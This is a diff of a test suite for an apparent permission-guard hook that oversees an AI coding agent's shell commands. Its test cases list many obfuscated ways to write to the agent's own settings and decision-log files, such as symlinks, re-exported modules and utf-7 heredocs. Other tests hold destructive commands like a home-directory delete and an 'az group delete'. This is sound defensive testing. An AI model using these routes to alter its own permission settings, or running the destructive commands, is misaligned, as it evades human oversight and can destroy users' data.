-            ('dict.copy is no write', f"python3 - <<'E' > /tmp/o.txt\nd = {{}}\ne = d.copy()\nprint(open('{log}').read())\nE",
-             False)]:
-        check(f'C9 {name}', w(cmd), want)
-    # A read of a config file is no C9 write, but the judge sees it (not allowed by rule)
-    for cmd in [f"python3 - <<'E' > {base}/o.txt\nprint(len(open('{log}').read()))\nE",
-                f"python3 -c \"print(open('{settings}').read()[:9])\""]:
-        check(f'config read goes to the judge: {cmd[:40]!r}',
-              (ev(cmd), p.human_required_reason('Bash', {'command': cmd})), ('ask', None))
+        # ---- g. a config write needs a write ----
+        log = os.path.join(os.path.expanduser('~'), '.claude', 'hooks', 'sp-test-decisions.jsonl')
+        settings = os.path.join(os.path.expanduser('~'), '.claude', 'settings.json')
+        link = os.path.join(base, 'out.txt')
+        os.symlink(settings, link)
+        w = p.bash_writes_to_config_path
+        for name, cmd, want in [
+                ('a heredoc read, output elsewhere',
+                 f"python3 - <<'E' > {base}/o.txt\nn = 0\nfor l in open('{log}'):\n    n += len(l) > 3\nprint(n)\nE",
+                 False),
+                ('a -c read, output elsewhere',
+                 f"python3 -c \"print(sum(1 for l in open('{log}')))\" > /tmp/o.txt", False),
+                ('a heredoc read into a pipe',
+                 f"python3 - <<'E' | tail -3\nfor l in open('{log}'):\n    print(l)\nE", False),
+                ('reads of the path with os.path',
+                 f"python3 - <<'E'\nimport os\nprint(os.path.getsize('{log}'), os.sep)\nE", False),
+                ('a write elsewhere beside the read',
+                 f"python3 - <<'E'\nimport os\nos.makedirs('/tmp/o', exist_ok=True)\n"
+                 f"open('/tmp/o/x.txt', 'w').write(open('{log}').read())\nE", False),
+                ('cat into a file', f'cat {log} > /tmp/x.txt', False),
+                ('open in write mode', f"python3 - <<'E'\nopen('{log}', 'w').write('x')\nE", True),
+                ('open r+', f"python3 -c \"open('{log}', 'r+')\"", True),
+                ('Path.write_text',
+                 f"python3 - <<'E'\nfrom pathlib import Path\nPath('{settings}').write_text('x')\nE", True),
+                ('Path.write_text on ~', "python3 - <<'E'\nfrom pathlib import Path\n"
+                 "Path('~/.claude/settings.json').expanduser().write_text('x')\nE", True),
+                ('os.replace onto it', f"python3 - <<'E'\nimport os\nos.replace('/tmp/a', '{log}')\nE", True),
+                ('os.replace by another name',
+                 f"python3 - <<'E'\nfrom os import replace as r\nr('/tmp/a', '{log}')\nE", True),
+                ('os through another module',
+                 f"python3 - <<'E'\nimport shlex\nshlex.os.replace('/tmp/a', '{log}')\nE", True),
+                ('shutil.copy onto it',
+                 f"python3 - <<'E'\nimport shutil\nshutil.copy('/tmp/a', '{settings}')\nE", True),
+                ('gzip.GzipFile', f"python3 - <<'E'\nimport gzip\ngzip.GzipFile('{log}', 'wb')\nE", True),
+                ('a write to a run-time path',
+                 f"python3 - <<'E'\nimport sys\nopen(sys.argv[1], 'w')\nprint(open('{log}').read())\nE", True),
+                ('a write through a name',
+                 f"python3 - <<'E'\np = '/tmp/x'\nopen(p, 'w')\nprint(open('{log}').read())\nE", True),
+                ('open passed around', f"python3 - <<'E'\nimport functools\n"
+                 f"f = functools.partial(open, mode='w')\nf('{log}')\nE", True),
+                ('an unseen module', f"python3 - <<'E'\nimport subprocess\nprint(open('{log}').read())\nE", True),
+                ('an unquoted heredoc', f"python3 - <<E\nprint(open('{log}').read())\nE", True),
+                ('a utf-7 heredoc', f"python3 - <<'E'\n# coding: utf-7\nprint(open('{log}').read())\nE", True),
+                ('a script file naming it', f'python3 tool.py {log}', True),
+                ('a write through a link',
+                 f"python3 - <<'E'\nopen('{link}', 'w').write('x')\nprint(open('{log}').read())\nE", True),
+                ('a redirect through a link', f'echo hi > {link}', True),
+                ('a relative redirect through a link', f'cd {base} && echo hi > out.txt', True),
+                ('a redirect onto it', f"python3 - <<'E' > {log}\nprint(1)\nE", True),
+                ('os under another name', f"python3 - <<'E'\nimport os\nm = os\nm.replace('/tmp/a', '{settings}')\nE", True),
+                ('shutil in a list', f"python3 - <<'E'\nimport shutil\nfor m in [shutil]:\n    m.copy('/tmp/a', '{settings}')\nE", True),
+                ('os passed along', f"python3 - <<'E'\nimport os\n(lambda q: q.replace('/tmp/a', '{log}'))(os)\nE", True),
+                ('script runs a copy into the folder', 'script -q /dev/null cp /tmp/settings.json ~/.claude/', True),
+                ('script -c copies into the folder', 'script -q -c "cp /tmp/settings.json ~/.claude/" /dev/null', True),
+                ('script runs a harmless copy', 'script -q /dev/null cp /tmp/a /tmp/b', False),
+                ('script -c with a copy later in it', 'script -q -c "true; cp /tmp/settings.json ~/.claude/" /dev/null', True),
+                ('shutil.copy into the folder',
+                 f"python3 - <<'E'\nimport shutil\nshutil.copy('/tmp/settings.json', '{os.path.dirname(settings)}/')\n"
+                 f"print(open('{log}').read())\nE", True),
+                ('shutil.rmtree of a parent', f"python3 - <<'E'\nimport shutil\nshutil.rmtree('{os.path.dirname(settings)}')\n"
+                 f"print(open('{log}').read())\nE", True),
+                ('Path.copy (3.14)', f"python3 - <<'E'\nfrom pathlib import Path\nPath('/tmp/s').copy('{settings}')\n"
+                 f"print(open('{log}').read())\nE", True),
+                ('os re-exported by another module',
+                 f"python3 - <<'E'\nfrom gzip import os as o\no.replace('/tmp/a', '{settings}')\nE", True),
+                ('a module that re-exports operator',
+                 f"python3 - <<'E'\nimport fractions\nfractions.operator.methodcaller('x')\nprint(open('{log}').read())\nE", True),
+                ('a Path constructor bound again',
+                 f"python3 - <<'E'\nfrom pathlib import Path\nPath = str\nPath('/tmp/a').write_text('x')\nprint(open('{log}').read())\nE", True),
+                ('Formatter.get_field reflection',
+                 f"python3 - <<'E'\nimport string\nf = string.Formatter().get_field('x', [], {{}})\nprint(open('{log}').read())\nE", True),
+                ('os re-exported by os.path',
+                 f"python3 - <<'E'\nfrom os.path import os as o\no.replace('/tmp/a', '{settings}')\nE", True),
+                ('dict.copy is no write', f"python3 - <<'E' > /tmp/o.txt\nd = {{}}\ne = d.copy()\nprint(open('{log}').read())\nE",
+                 False)]:
+            check(f'C9 {name}', w(cmd), want)
+        # A read of a config file is no C9 write, but the judge sees it (not allowed by rule)
+        for cmd in [f"python3 - <<'E' > {base}/o.txt\nprint(len(open('{log}').read()))\nE",
+                    f"python3 -c \"print(open('{settings}').read()[:9])\""]:
+            check(f'config read goes to the judge: {cmd[:40]!r}',
+                  (ev(cmd), p.human_required_reason('Bash', {'command': cmd})), ('ask', None))
 
-    # ---- e. every log record carries the version, the input length and a truncated flag ----
-    mk = os.path.join(SCRIPT_DIR, '..', '..', '.claude-plugin', 'marketplace.json')
-    with open(mk) as f:
-        check('HOOK_VERSION is the marketplace version', p.HOOK_VERSION, json.load(f)['metadata']['version'])
-    cfg, cp = _fresh_cfg()
+        # ---- e. every log record carries the version, the input length and a truncated flag ----
+        mk = os.path.join(SCRIPT_DIR, '..', '..', '.claude-plugin', 'marketplace.json')
+        with open(mk) as f:
+            check('HOOK_VERSION is the marketplace version', p.HOOK_VERSION, json.load(f)['metadata']['version'])
+        cfg, cp = _fresh_cfg()
 
-    def hook(payload, path=cp):
-        return _run_cfg(PRETOOL, payload, path)
+        def hook(payload, path=cp):
+            return _run_cfg(PRETOOL, payload, path)
 
-    hook({'tool_name': 'Bash', 'tool_input': {'command': 'echo ' + 'x' * 700}})
-    hook({'tool_name': 'Bash', 'tool_input': {'command': 'ls'}})
-    recs = _decision_records(cfg)
-    check('log: version, length and truncated flag',
-          [(r.get('v'), r.get('input_len'), r.get('truncated'), len(r.get('input', ''))) for r in recs[-2:]],
-          [(p.HOOK_VERSION, 705, True, 500), (p.HOOK_VERSION, 2, False, 2)])
-    logp = os.path.join(cfg, 'hooks', 'smart-permissions-decisions.jsonl')
-    if os.name != 'nt':  # POSIX mode bits
-        check('log: created owner-only', oct(os.stat(logp).st_mode & 0o777), '0o600')
-        os.chmod(logp, 0o644)
+        hook({'tool_name': 'Bash', 'tool_input': {'command': 'echo ' + 'x' * 700}})
         hook({'tool_name': 'Bash', 'tool_input': {'command': 'ls'}})
-        check('log: an existing readable log is narrowed', oct(os.stat(logp).st_mode & 0o777), '0o600')
-    # rotation: once, under the lock, with the size checked again inside it
-    rot = os.path.join(base, 'rot.jsonl')
-    with open(rot, 'w') as f:
-        f.write('o' * 100)
-    os.chmod(rot, 0o644)  # a log from before 1.6.0
-    try:
-        import fcntl
-    except ImportError:  # Windows: no lock and no mode bits to check
-        fcntl = None
-    if fcntl:
-        held = os.open(rot + '.lock', os.O_WRONLY | os.O_CREAT, 0o600)
-        fcntl.flock(held, fcntl.LOCK_EX)
-        p._append_log_line(rot, 'a\n', 50)
-        check('rotation: skipped while the other hook holds the lock',
-              (os.path.exists(rot + '.1'), os.path.getsize(rot)), (False, 102))
-        os.close(held)
-        p._append_log_line(rot, 'b\n', 50)
-        with open(rot) as f:
-            check('rotation: one generation once the lock is free, both owner-only',
-                  (os.path.getsize(rot + '.1'), f.read(), oct(os.stat(rot).st_mode & 0o777),
-                   oct(os.stat(rot + '.1').st_mode & 0o777)),
-                  (102, 'b\n', '0o600', '0o600'))
-        p._append_log_line(rot, 'c\n', 50)
-        check('rotation: a short new log is not rotated again', os.path.getsize(rot + '.1'), 102)
-    # opt-in fuller capture: capped, secrets redacted, marked incomplete
-    cfg2, cp2 = _fresh_cfg({'decision_log_full_input': True})
-    secret_cmd = ('curl -H "Authorization: Bearer abcdefgh12345678" https://x.example/a; '
-                  'API_TOKEN=s3cr3tvalue ./run.sh --password hunter22 ' + 'y' * 900)
-    hook({'tool_name': 'Bash', 'tool_input': {'command': secret_cmd}}, cp2)
-    hook({'tool_name': 'Bash', 'tool_input': {'command': 'ls -la'}}, cp2)
-    r1, r2 = _decision_records(cfg2)[-2:]
-    check('full capture: whole input, secrets redacted',
-          (len(r1['input']) > 900, 'abcdefgh12345678' in r1['input'], 's3cr3tvalue' in r1['input'],
-           'hunter22' in r1['input'], r1['redacted'], r1['incomplete'], r1['truncated']),
-          (True, False, False, False, True, True, False))
-    check('full capture: a clean input is complete',
-          (r2['input'], r2['redacted'], r2['incomplete']), ('ls -la', False, False))
-    saved_cap = p.DECISION_LOG_FULL_INPUT_CHARS
-    saved = (p.DECISION_LOG_ENABLED, p.DECISION_LOG_FULL_INPUT, p.DECISION_LOG_PATH)
-    try:
-        p.DECISION_LOG_ENABLED, p.DECISION_LOG_FULL_INPUT = True, True
-        p.DECISION_LOG_PATH = os.path.join(base, 'cap.jsonl')
-        p.DECISION_LOG_FULL_INPUT_CHARS = 40
-        p.log_decision('pretool', 'Bash', {'command': 'x' * 30 + ' --password "hunter22long"'}, 'ask', 'rule', 'r')
-        with open(p.DECISION_LOG_PATH) as f:
-            r3 = json.loads(f.read().splitlines()[-1])
-        check('full capture: capped, a secret cut at the cap still redacted',
-              (len(r3['input']), 'hunter' in r3['input'], r3['truncated'], r3['incomplete']),
-              (40, False, True, True))
-    finally:
-        p.DECISION_LOG_FULL_INPUT_CHARS = saved_cap
-        p.DECISION_LOG_ENABLED, p.DECISION_LOG_FULL_INPUT, p.DECISION_LOG_PATH = saved
-    red, hit = p._redact_secrets('-----BEGIN RSA PRIVATE KEY-----\nMIIabc\n-----END RSA PRIVATE KEY----- and '
-                                 'https://user:pw123@git.example/x and ghp_' + 'a' * 30)
-    check('redaction: key block, URL password, token', ('MIIabc' in red, 'pw123' in red, 'ghp_' in red, hit),
-          (False, False, False, True))
-    check('redaction: a shell variable is not a secret', p._redact_secrets('TOKEN="$T" ./x')[1], False)
-    check('redaction: a backslash before a newline in the value',
-          p._redact_secrets('x --password "ab\\\ncd" next')[0], 'x --password [REDACTED] next')
-    _t0 = time.time()
-    p._redact_secrets(('a.' * 20000) + ' x')
-    check('redaction: long dotted text stays fast', time.time() - _t0 < 0.5, True)
-    check('redaction: a quoted value over two lines',
-          p._redact_secrets('x --password "line1\nline2" next')[0], 'x --password [REDACTED] next')
-    check('redaction: an escaped quote inside the value',
-          p._redact_secrets('x --password "ab\\"cd efgh" next')[0], 'x --password [REDACTED] next')
+        recs = _decision_records(cfg)
+        check('log: version, length and truncated flag',
+              [(r.get('v'), r.get('input_len'), r.get('truncated'), len(r.get('input', ''))) for r in recs[-2:]],
+              [(p.HOOK_VERSION, 705, True, 500), (p.HOOK_VERSION, 2, False, 2)])
+        logp = os.path.join(cfg, 'hooks', 'smart-permissions-decisions.jsonl')
+        if os.name != 'nt':  # POSIX mode bits
+            check('log: created owner-only', oct(os.stat(logp).st_mode & 0o777), '0o600')
+            os.chmod(logp, 0o644)
+            hook({'tool_name': 'Bash', 'tool_input': {'command': 'ls'}})
+            check('log: an existing readable log is narrowed', oct(os.stat(logp).st_mode & 0o777), '0o600')
+        # rotation: once, under the lock, with the size checked again inside it
+        rot = os.path.join(base, 'rot.jsonl')
+        with open(rot, 'w') as f:
+            f.write('o' * 100)
+        os.chmod(rot, 0o644)  # a log from before 1.6.0
+        try:
+            import fcntl
+        except ImportError:  # Windows: no lock and no mode bits to check
+            fcntl = None
+        if fcntl:
+            held = os.open(rot + '.lock', os.O_WRONLY | os.O_CREAT, 0o600)
+            fcntl.flock(held, fcntl.LOCK_EX)
+            p._append_log_line(rot, 'a\n', 50)
+            check('rotation: skipped while the other hook holds the lock',
+                  (os.path.exists(rot + '.1'), os.path.getsize(rot)), (False, 102))
+            os.close(held)
+            p._append_log_line(rot, 'b\n', 50)
+            with open(rot) as f:
+                check('rotation: one generation once the lock is free, both owner-only',
+                      (os.path.getsize(rot + '.1'), f.read(), oct(os.stat(rot).st_mode & 0o777),
+                       oct(os.stat(rot + '.1').st_mode & 0o777)),
+                      (102, 'b\n', '0o600', '0o600'))
+            p._append_log_line(rot, 'c\n', 50)
+            check('rotation: a short new log is not rotated again', os.path.getsize(rot + '.1'), 102)
+        # opt-in fuller capture: capped, secrets redacted, marked incomplete
+        cfg2, cp2 = _fresh_cfg({'decision_log_full_input': True})
+        secret_cmd = ('curl -H "Authorization: Bearer abcdefgh12345678" https://x.example/a; '
+                      'API_TOKEN=s3cr3tvalue ./run.sh --password hunter22 ' + 'y' * 900)
+        hook({'tool_name': 'Bash', 'tool_input': {'command': secret_cmd}}, cp2)
+        hook({'tool_name': 'Bash', 'tool_input': {'command': 'ls -la'}}, cp2)
+        r1, r2 = _decision_records(cfg2)[-2:]
+        check('full capture: whole input, secrets redacted',
+              (len(r1['input']) > 900, 'abcdefgh12345678' in r1['input'], 's3cr3tvalue' in r1['input'],
+               'hunter22' in r1['input'], r1['redacted'], r1['incomplete'], r1['truncated']),
+              (True, False, False, False, True, True, False))
+        check('full capture: a clean input is complete',
+              (r2['input'], r2['redacted'], r2['incomplete']), ('ls -la', False, False))
+        saved_cap = p.DECISION_LOG_FULL_INPUT_CHARS
+        saved = (p.DECISION_LOG_ENABLED, p.DECISION_LOG_FULL_INPUT, p.DECISION_LOG_PATH)
+        try:
+            p.DECISION_LOG_ENABLED, p.DECISION_LOG_FULL_INPUT = True, True
+            p.DECISION_LOG_PATH = os.path.join(base, 'cap.jsonl')
+            p.DECISION_LOG_FULL_INPUT_CHARS = 40
+            p.log_decision('pretool', 'Bash', {'command': 'x' * 30 + ' --password "hunter22long"'}, 'ask', 'rule', 'r',
+                           state=p.CallState())
+            with open(p.DECISION_LOG_PATH) as f:
+                r3 = json.loads(f.read().splitlines()[-1])
+            check('full capture: capped, a secret cut at the cap still redacted',
+                  (len(r3['input']), 'hunter' in r3['input'], r3['truncated'], r3['incomplete']),
+                  (40, False, True, True))
+        finally:
+            p.DECISION_LOG_FULL_INPUT_CHARS = saved_cap
+            p.DECISION_LOG_ENABLED, p.DECISION_LOG_FULL_INPUT, p.DECISION_LOG_PATH = saved
+        red, hit = p._redact_secrets('-----BEGIN RSA PRIVATE KEY-----\nMIIabc\n-----END RSA PRIVATE KEY----- and '
+                                     'https://user:pw123@git.example/x and ghp_' + 'a' * 30)
+        check('redaction: key block, URL password, token', ('MIIabc' in red, 'pw123' in red, 'ghp_' in red, hit),
+              (False, False, False, True))
+        check('redaction: a shell variable is not a secret', p._redact_secrets('TOKEN="$T" ./x')[1], False)
+        check('redaction: a backslash before a newline in the value',
+              p._redact_secrets('x --password "ab\\\ncd" next')[0], 'x --password [REDACTED] next')
+        _t0 = time.time()
+        p._redact_secrets(('a.' * 20000) + ' x')
+        check('redaction: long dotted text stays fast', time.time() - _t0 < 0.5, True)
+        check('redaction: a quoted value over two lines',
+              p._redact_secrets('x --password "line1\nline2" next')[0], 'x --password [REDACTED] next')
+        check('redaction: an escaped quote inside the value',
+              p._redact_secrets('x --password "ab\\"cd efgh" next')[0], 'x --password [REDACTED] next')
 
-    # ---- f. the learner: rule_reason everywhere, AskUserQuestion left alone ----
-    cfg3, cp3 = _fresh_cfg()
-    _run_cfg(LEARNER, {'tool_name': 'Bash', 'tool_input': {'command': 'frobnicate'}}, cp3)
-    _run_cfg(LEARNER, {'tool_name': 'Bash', 'tool_input': {'command': f'{rmrf} ~'}}, cp3)
-    _run_cfg(LEARNER, {}, cp3, raw_input='not json')
-    _run_cfg(LEARNER, {'tool_name': 'Bash', 'tool_input': {'command': f'cp x {settings}'}}, cp3)
-    recs = _decision_records(cfg3)
-    check('learner: every record has a rule_reason', [bool(r.get('rule_reason')) for r in recs], [True] * 4)
-    check('learner: unconfigured says so, the rules punt kept',
-          ('LLM not configured' in recs[0]['reason'], 'Unknown command' in recs[0]['rule_reason']),
-          (True, True))
-    check('learner: malformed input', recs[2]['rule_reason'], 'malformed hook input')
-    reqs = os.path.join(base, 'reqs.jsonl')
-    out = _run_cfg(LEARNER, {'tool_name': 'AskUserQuestion', 'tool_input': {'questions': []}}, cp3,
-                   llm={'safe': True}, requests_log=reqs, full=True)
-    check('learner: AskUserQuestion gets no decision and no judge',
-          (out, os.path.exists(reqs)), (('ask', False), False))
-    check('learner: AskUserQuestion is logged with a rule_reason',
-          _decision_records(cfg3)[-1].get('rule_reason'), 'built-in question tool')
-    out = _run_cfg(LEARNER, {'tool_name': 'mcp__srv__AskUserQuestion', 'tool_input': {}}, cp3,
-                   llm={'safe': True}, requests_log=reqs)
-    check('learner: an MCP tool with that suffix is judged', (out, os.path.exists(reqs)), ('allow', True))
+        # ---- f. the learner: rule_reason everywhere, AskUserQuestion left alone ----
+        cfg3, cp3 = _fresh_cfg()
+        _run_cfg(LEARNER, {'tool_name': 'Bash', 'tool_input': {'command': 'frobnicate'}}, cp3)
+        _run_cfg(LEARNER, {'tool_name': 'Bash', 'tool_input': {'command': f'{rmrf} ~'}}, cp3)
+        _run_cfg(LEARNER, {}, cp3, raw_input='not json')
+        _run_cfg(LEARNER, {'tool_name': 'Bash', 'tool_input': {'command': f'cp x {settings}'}}, cp3)
+        recs = _decision_records(cfg3)
+        check('learner: every record has a rule_reason', [bool(r.get('rule_reason')) for r in recs], [True] * 4)
+        check('learner: unconfigured says so, the rules punt kept',
+              ('LLM not configured' in recs[0]['reason'], 'Unknown command' in recs[0]['rule_reason']),
+              (True, True))
+        check('learner: malformed input', recs[2]['rule_reason'], 'malformed hook input')
+        reqs = os.path.join(base, 'reqs.jsonl')
+        out = _run_cfg(LEARNER, {'tool_name': 'AskUserQuestion', 'tool_input': {'questions': []}}, cp3,
+                       llm={'safe': True}, requests_log=reqs, full=True)
+        check('learner: AskUserQuestion gets no decision and no judge',
+              (out, os.path.exists(reqs)), (('ask', False), False))
+        check('learner: AskUserQuestion is logged with a rule_reason',
+              _decision_records(cfg3)[-1].get('rule_reason'), 'built-in question tool')
+        out = _run_cfg(LEARNER, {'tool_name': 'mcp__srv__AskUserQuestion', 'tool_input': {}}, cp3,
+                       llm={'safe': True}, requests_log=reqs)
+        check('learner: an MCP tool with that suffix is judged', (out, os.path.exists(reqs)), ('allow', True))
 
-    # ---- h. the judge is told which copy of the guard is live ----
-    note = p.live_hook_note({'file_path': '/src/wt/smart-permissions/scripts/pretool_safety.py'})
-    check('judge note: names the live copy',
-          (p.PLUGIN_ROOT in note, 'until that copy is installed' in note), (True, True))
-    check('judge note: a relative path into the package names the live copy',
-          p.PLUGIN_ROOT in p.live_hook_note({'file_path': 'scripts/smart_permissions/core.py'}), True)
-    check('judge note: none for other calls', p.live_hook_note({'command': 'ls'}), '')
-    ctx = p.build_llm_context({'cwd': base, 'tool_name': 'Edit', 'tool_input': {
-        'file_path': '/src/wt/smart-permissions/scripts/permission_learner.py'}})
-    check('judge note: in the context', p.PLUGIN_ROOT in ctx, True)
+        # ---- h. the judge is told which copy of the guard is live ----
+        note = p.live_hook_note({'file_path': '/src/wt/smart-permissions/scripts/pretool_safety.py'})
+        check('judge note: names the live copy',
+              (p.PLUGIN_ROOT in note, 'until that copy is installed' in note), (True, True))
+        check('judge note: a relative path into the package names the live copy',
+              p.PLUGIN_ROOT in p.live_hook_note({'file_path': 'scripts/smart_permissions/core.py'}), True)
+        check('judge note: none for other calls', p.live_hook_note({'command': 'ls'}), '')
+        ctx = p.build_llm_context({'cwd': base, 'tool_name': 'Edit', 'tool_input': {
+            'file_path': '/src/wt/smart-permissions/scripts/permission_learner.py'}}, call_state)
+        check('judge note: in the context', p.PLUGIN_ROOT in ctx, True)
 
 
 def test_phase1_evidence_and_rule_fixes():
@@ -6794,11 +6812,12 @@ def test_phase1_evidence_and_rule_fixes():
     _transcript(lead, [_human('back up the bundle LEAD-TEXT')])
     _transcript(agent, [{'type': 'user', 'message': {'role': 'user', 'content': 'delete gen-out and rebuild BRIEF-TEXT'}}])
     ctx = p.build_llm_context({'cwd': base, 'tool_name': 'Bash', 'tool_input': {'command': 'ls'},
-                               'transcript_path': lead, 'agent_transcript_path': agent})
+                               'transcript_path': lead, 'agent_transcript_path': agent}, p.CallState())
     check('brief: labelled, beside the lead\'s messages',
           'not typed by the developer' in ctx and 'BRIEF-TEXT' in ctx and 'LEAD-TEXT' in ctx, True)
     check('brief: none for the lead itself', 'brief' in p.build_llm_context(
-        {'cwd': base, 'tool_name': 'Bash', 'tool_input': {'command': 'ls'}, 'transcript_path': lead}), False)
+        {'cwd': base, 'tool_name': 'Bash', 'tool_input': {'command': 'ls'}, 'transcript_path': lead},
+        p.CallState()), False)
 
     # ---- 4. the local scripts a call runs ----
     proj = os.path.join(base, 'proj')
@@ -6987,12 +7006,9 @@ def test_phase1_evidence_and_rule_fixes():
     _run_cfg(PRETOOL, call, cp, llm=[{'safe': False, 'category': 1, 'reason': 'echoes RUN-BODY bare'}])
     check('scripts: an unquoted echo of script text stays out of the log',
           any('RUN-BODY' in json.dumps(r) for r in _decision_records(cfg)), False)
-    p.SCRIPT_CONTEXT_TEXTS[:] = ['#!/bin/sh\necho RUN-BODY\n']
-    try:
-        check('scripts: the reason shown is scrubbed of quoted script text',
-              p.scrub_script_text('it runs `echo RUN-BODY` remotely'), 'it runs `[script text]` remotely')
-    finally:
-        p.SCRIPT_CONTEXT_TEXTS.clear()
+    check('scripts: the reason shown is scrubbed of quoted script text',
+          p.scrub_script_text('it runs `echo RUN-BODY` remotely', ['#!/bin/sh\necho RUN-BODY\n']),
+          'it runs `[script text]` remotely')
     os.makedirs(os.path.join(base, 'fake-home', '.ssh'))
     with open(os.path.join(base, 'fake-home', '.ssh', 'id_x'), 'w') as f:
         f.write('#!/bin/sh\nKEY-BODY\n')
@@ -7063,15 +7079,13 @@ def test_phase1_evidence_and_rule_fixes():
           p._stash_made_in("printf 'note; git stash push; end'", repo, os.path.realpath(repo)), False)
     saved_flag = p.LLM_FLAG_PATH
     p.LLM_FLAG_PATH = os.path.join(base, 'flags.json')
-    p.SCRIPT_CONTEXT_TEXTS[:] = ['echo RUN-BODY\n']
     try:
-        p._flag_put('Bash', {'command': 'x'}, 'LLM: category 2: runs RUN-BODY, category 4242')
+        p._flag_put('Bash', {'command': 'x'}, 'LLM: category 2: runs RUN-BODY, category 4242', ['echo RUN-BODY\n'])
         with open(p.LLM_FLAG_PATH) as f:
             stored = f.read()
         check('scripts: the flag state the learner logs holds no judge words',
               'RUN-BODY' not in stored and '4242' not in stored and 'category 2' in stored, True)
     finally:
-        p.SCRIPT_CONTEXT_TEXTS.clear()
         p.LLM_FLAG_PATH = saved_flag
 
 
@@ -7631,7 +7645,7 @@ def test_phase2_remote_exec():
     p.LLM_FLAG_PATH = os.path.join(tempfile.mkdtemp(prefix='sp-flags-'), 'flags.json')
     atexit.register(shutil.rmtree, os.path.dirname(p.LLM_FLAG_PATH), ignore_errors=True)
     try:
-        threads = [threading.Thread(target=p._flag_put, args=('Bash', {'command': f'c{i}'}, 'r'))
+        threads = [threading.Thread(target=p._flag_put, args=('Bash', {'command': f'c{i}'}, 'r', ()))
                    for i in range(12)]
         [t.start() for t in threads]
         [t.join() for t in threads]
@@ -7924,11 +7938,8 @@ def test_prompt_timeout_1_8_0():
     # The parked message: judge words that quote a script shown to it are scrubbed.
     sys.path.insert(0, SCRIPT_DIR)
     from smart_permissions import learner as pl
-    p.SCRIPT_CONTEXT_TEXTS[:] = ['az group delete -n rg-example --yes\n']
-    try:
-        msg = pl.parked_message(p.scrub_script_text('LLM: category 4: runs `az group delete -n rg-example --yes`'), 10)
-    finally:
-        p.SCRIPT_CONTEXT_TEXTS.clear()
+    msg = pl.parked_message(p.scrub_script_text('LLM: category 4: runs `az group delete -n rg-example --yes`',
+                                                ['az group delete -n rg-example --yes\n']), 10)
     check('parked message: script text scrubbed', ('rg-example' in msg, '[script text]' in msg), (False, True))
     check('parked message: minutes shown', 'within 10 minutes' in pl.parked_message('x', 10), True)
 
